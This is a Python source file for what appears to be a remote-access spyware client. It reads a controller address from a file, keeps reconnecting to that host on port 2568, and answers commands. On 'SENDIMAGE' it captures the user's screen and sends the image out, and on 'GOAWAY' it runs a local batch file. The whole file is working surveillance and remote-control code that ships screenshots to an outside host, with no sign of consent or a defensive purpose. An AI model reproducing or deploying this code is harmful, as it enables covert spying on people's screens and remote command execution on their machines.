import socket
import time
import random
import os, subprocess, sys
import pyautogui
import datetime

f = open('host.txt', 'r')
f.seek(0)
ip = f.read()
f.close()

#--------------------------------------------------------------
FORMAT = "utf-8"
DISCONNECT_MESSAGE = "!DISCONNECT"
PORT = 2568
SERVER = ip
ADDR = (SERVER, PORT)
#--------------------------------------------------------------

def randomNum(digits):
    final = ''
    for i in range(digits):
        final += str(random.randint(0, 9))

    return final

f = open('id.txt', 'a+')
f.seek(0)
myId = f.read()

if os.stat("id.txt").st_size == 0:
    f.write(randomNum(5))
    f.seek(0)
    myId = f.read()

#--------------------------------------------------------------
while True:
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(ADDR)
        break
    except Exception as e:
        if str(e) != "[WinError 10061] No connection could be made because the target machine actively refused it":
            sys.exit()
#--------------------------------------------------------------

def send(msg):
    message = msg.encode(FORMAT)
    client.send(message)

def send_image():
    myScreenshot = pyautogui.screenshot()
    dir_path = os.path.dirname(os.path.realpath(__file__))
    nom = str(datetime.datetime.now()).replace(':', "'")
    nom = nom.split('.')[0]
    myScreenshot.save(f'{dir_path}\images\{nom}.png')
    myfile = open(f'images/{nom}.png', 'rb')
    fileInfo = myfile.read()
    size = len(fileInfo)

    time.sleep(.2)
    send('SIZE ' + str(size))
    print('SIZE ' + str(size))
    time.sleep(.2)
    send('SENDING')
    print('Going to send image')
    time.sleep(.2)
    client.sendall(fileInfo)
    print('Sent image!')

send(f'CLIENT ' + myId)

yes = True

# while yes:
#     msg = client.recv(1024).decode(FORMAT)
#     print(msg)
#     if msg == 'SENDIMAGE':
#         print('Request received')
#         send_image()
#         msg = client.recv(1024)
#     elif msg == 'GOAWAY':
#         dir_path = os.path.dirname(os.path.realpath(__file__))
#         subprocess.call([f'{dir_path}\yes.bat'])
#     elif msg == 'testing':
#         print('A good test! :)')

while True:
    try:
        while yes:
            print('in main loop again!')
            msg = client.recv(1024).decode(FORMAT)
            print(msg)
            if msg == 'SENDIMAGE':
                print('Request received')
                send_image()
                msg = client.recv(1024)
            elif msg == 'GOAWAY':
                dir_path = os.path.dirname(os.path.realpath(__file__))
                subprocess.call([f'{dir_path}\yes.bat'])
            elif msg == 'testing':
                print('A good test! :)')
        break
    except:
        while True:
            time.sleep(1)
            try:
                print('trying to reconnect')
                # client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.connect(ADDR)
                send(f'CLIENT ' + myId)
                break
            except:
                pass